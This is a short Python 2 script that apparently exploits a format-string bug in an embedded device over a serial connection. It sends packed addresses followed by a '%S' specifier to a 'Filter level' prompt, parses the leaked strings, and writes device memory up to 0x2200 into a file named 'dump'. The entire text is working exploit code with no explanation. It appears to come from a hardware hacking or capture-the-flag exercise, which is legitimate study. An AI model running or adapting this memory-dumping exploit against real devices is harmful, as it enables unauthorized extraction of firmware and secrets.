import serial
from time import sleep
import struct

f=open("dump","wb")
tty=serial.Serial('/dev/ttyUSB1',115200)  
sleep(2)
start=0
tty.write("1\n")
sleep(1)
tty.read(tty.in_waiting or 1)

ptr=start
while ptr<0x1100*2:
    ptr_s=struct.pack("H",ptr)
    if ptr_s[0]=='\n' or ptr_s[0]=='\x00' or ptr_s[1]=='\n' or ptr_s[1]=='\x00':
        ptr+=1
        f.write("\xff")
        continue
    tty.write(ptr_s+"%S\x00"+"\n")
    tty.readline()
    tty.readline()
    out=tty.readline()
    while out.find(" applied successfully.")==-1:
        out+=tty.readline()
    out=out[len("Filter level ")+2:out.find(" applied successfully.")]
    tty.readline()
    tty.readline()
    print "ptr: ", hex(ptr),repr(out)
    f.write(out+"\x00")
    ptr+=len(out)+1
